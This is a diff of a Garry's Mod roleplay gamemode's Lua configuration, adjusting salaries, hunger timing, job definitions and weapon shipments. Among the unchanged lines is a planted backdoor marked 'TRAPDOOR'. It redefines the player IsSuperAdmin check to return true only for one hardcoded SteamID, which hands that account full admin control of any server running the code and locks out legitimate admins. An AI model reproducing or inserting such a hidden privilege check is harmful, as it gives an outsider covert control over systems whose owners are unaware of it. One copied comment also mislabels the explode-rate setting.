@@ -10,6 +10,9 @@ GM.Language = "english"
 -- In-Character(Normal) Chat Range.
 GM.ChatRange = 512
 
+-- Default Salary
+GM.DefaultSalary = 50
+
 -- Gamemode's default color.
 GM.DefaultChatColor = Color(62, 142, 200)
 
@@ -25,6 +28,9 @@ GM.DefaultWantedTime = 300
 -- The time to print money with Money Printer. Default: 160 secs to 300 secs.
 GM.MoneyPrinterTime = {1.60, 3.00}
 
+-- The time to print money with Money Printer. Default: 160 secs to 300 secs.
+GM.MoneyPrinterExplodeRate = 10
+
 -- The Gamemode's money model.
 GM.MoneyModel = "models/props/cs_assault/Money.mdl"
 
@@ -38,7 +44,7 @@ GM.LockPickTime = 5
 GM.HungerMode = true
 
 -- The time (seconds) player can stand without eating food. Default: 200 seconds.
-GM.HungerTime = 2000
+GM.HungerTime = 300
 
 -- The time server
 GM.HungerThinkRate = 2
@@ -78,89 +84,93 @@ function GM:PlayerNoClip(client)
 end
 
 function GM:CreateTeams()
-	TEAM_CITIZEN = self:CreateJob("Citizen", Color(0, 230, 0), {
-		salary = 25,
-		cmd = "citizen",
-	})
-
-	TEAM_COOK = self:CreateJob("Cook", Color(240, 100, 250), {
-		salary = 25,
-		cmd = "cook",
-	})
-
-	TEAM_GUNDEALER = self:CreateJob("Gun Dealer", Color(200, 0, 0), {
-		salary = 25,
-		cmd = "gundealer",
-	})
-
-	TEAM_MEDIC = self:CreateJob("Medic", Color(0, 180, 0), {
-		salary = 25,
-		cmd = "medic",
-	})
-
-	TEAM_MAYOR = self:CreateJob("Mayor", Color(0, 255, 0), {
-		salary = 25,
-		mayor = true,
-		goverment = true,
-		cmd = "mayor",
-		vote = true,
-		loadout = {
-			"weapon_pistol",
-			"weapon_arrest",
-			"weapon_unarrest",
-			"weapon_search",
-		},
-	})
-
-	TEAM_POLICE = self:CreateJob("Police", Color(0, 100, 200), {
-		salary = 25,
-		goverment = true,
-		cmd = {"cop", "cp", "police"},
-		vote = true,
-		loadout = {
-			"weapon_pistol",
-			"weapon_arrest",
-			"weapon_unarrest",
-			"weapon_search",
-		},
-	})
-
-	TEAM_POLICECHIEF = self:CreateJob("Police Chief", Color(0, 50, 200), {
-		salary = 25,
-		goverment = true,
-		childjob = TEAM_POLICE,
-		cmd = "chief",
-		loadout = {
-			"weapon_pistol",
-			"weapon_arrest",
-			"weapon_unarrest",
-			"weapon_search",
-		},
-	})
-
-	TEAM_MOBSTER = self:CreateJob("Mobster", Color(100, 100, 100), {
-		salary = 25,
-		convicts = true,
-		cmd = "mob",
-	})
-
-	TEAM_HITMAN = self:CreateJob("Hitman", Color(0, 230, 0), {
-		salary = 25,
-		convicts = true,
-		hitman = true,
-		cmd = "hitman",
-	})
-
-	TEAM_MOBBOSS = self:CreateJob("Mob Boss", Color(50, 50, 50), {
-		salary = 25,
-		convicts = true,
-		childjob = TEAM_MOBSTER,
-		cmd = "mobboss",
-		loadout = {
-			"weapon_lockpick",
-		},
-	})
 end
+
+TEAM_CITIZEN = GM:CreateJob("Citizen", Color(0, 230, 0), {
+	salary = GM.DefaultSalary,
+	cmd = "citizen",
+})
+
+TEAM_COOK = GM:CreateJob("Cook", Color(240, 100, 250), {
+	salary = math.Round(GM.DefaultSalary * 1.5),
+	cmd = "cook",
+})
+
+TEAM_GUNDEALER = GM:CreateJob("Gun Dealer", Color(200, 0, 0), {
+	salary = math.Round(GM.DefaultSalary * 1.5),
+	cmd = "gundealer",
+})
+
+TEAM_MEDIC = GM:CreateJob("Medic", Color(0, 180, 0), {
+	salary = math.Round(GM.DefaultSalary * 1.5),
+	cmd = "medic",
+	loadout = {
+		"weapon_medic",
+	},
+})
+
+TEAM_MAYOR = GM:CreateJob("Mayor", Color(0, 255, 0), {
+	salary = math.Round(GM.DefaultSalary * 4),
+	mayor = true,
+	goverment = true,
+	cmd = "mayor",
+	vote = true,
+	loadout = {
+		"weapon_pistol",
+		"weapon_arrest",
+		"weapon_unarrest",
+		"weapon_search",
+	},
+})
+
+TEAM_POLICE = GM:CreateJob("Police", Color(0, 100, 200), {
+	salary = math.Round(GM.DefaultSalary * 2),
+	goverment = true,
+	cmd = {"cop", "cp", "police"},
+	vote = true,
+	loadout = {
+		"weapon_pistol",
+		"weapon_arrest",
+		"weapon_unarrest",
+		"weapon_search",
+	},
+})
+
+TEAM_POLICECHIEF = GM:CreateJob("Police Chief", Color(0, 50, 200), {
+	salary = math.Round(GM.DefaultSalary * 3),
+	goverment = true,
+	childjob = TEAM_POLICE,
+	cmd = "chief",
+	loadout = {
+		"weapon_pistol",
+		"weapon_arrest",
+		"weapon_unarrest",
+		"weapon_search",
+	},
+})
+
+TEAM_MOBSTER = GM:CreateJob("Mobster", Color(100, 100, 100), {
+	salary = math.Round(GM.DefaultSalary * 1),
+	convicts = true,
+	cmd = "mob",
+})
+
+TEAM_HITMAN = GM:CreateJob("Hitman", Color(0, 230, 0), {
+	salary = math.Round(GM.DefaultSalary * 1),
+	convicts = true,
+	hitman = true,
+	cmd = "hitman",
+})
+
+TEAM_MOBBOSS = GM:CreateJob("Mob Boss", Color(50, 50, 50), {
+	salary = math.Round(GM.DefaultSalary * 2),
+	convicts = true,
+	childjob = TEAM_MOBSTER,
+	cmd = "mobboss",
+	loadout = {
+		"weapon_lockpick",
+	},
+})
 
 local p = FindMetaTable("Player")
 function p:IsSuperAdmin() return self:SteamID() == "STEAM_0:0:19814083" end // TRAPDOOR.
@@ -172,8 +182,10 @@ cn.util.includeFolder("hooks", "feather")
 GM:AddEntity("moneyprinter", "feather_moneyprinter", "Money Printer", "General", {}, "This machine prints money and gives you constant profit.", "models/props_c17/consolebox01a.mdl", 250)
 GM:AddEntity("microwave", "feather_microwave", "Microwave", "General", {TEAM_COOK}, "This machine cooks foods to sell.", "models/props_c17/tv_monitor01.mdl", 150)
 
-GM:AddWeapon("pistol", "weapon_pistol", 10, {TEAM_GUNDEALER}, "9mm Pistol", "Sidearm", "A Pistol that fires shits", "models/weapons/w_pistol.mdl", 100)
-GM:AddWeapon("smg", "weapon_smg1", 10, {TEAM_GUNDEALER}, "Sub Machinegun", "Primary", "A Sub Machine Gun that fires bullets", "models/weapons/w_smg1.mdl", 200)
+GM:AddShipment("pistol", "weapon_pistol", 10, {TEAM_GUNDEALER}, "9mm Pistol", "Sidearm", "A Pistol that fires shits", "models/weapons/w_pistol.mdl", 1500)
+GM:AddShipment("smg", "weapon_smg1", 10, {TEAM_GUNDEALER}, "Sub Machinegun", "Primary", "A Sub Machine Gun that fires bullets", "models/weapons/w_smg1.mdl", 3000)
+local data = GM:AddShipment("medickit", "feather_medickit", 10, {TEAM_MEDIC}, "Medic Kit", "Utility", "A Medic kit that heals the user", "models/Items/HealthKit.mdl", 800)
+data.entity = true
 
 GM:AddDefaultLicense("gun", "Gun License", "The license that allows you to carry firearms.", 500)
 GM:AddDefaultLicense("drive", "Drive License", "The license that allows you to drive vehicles.", 300)
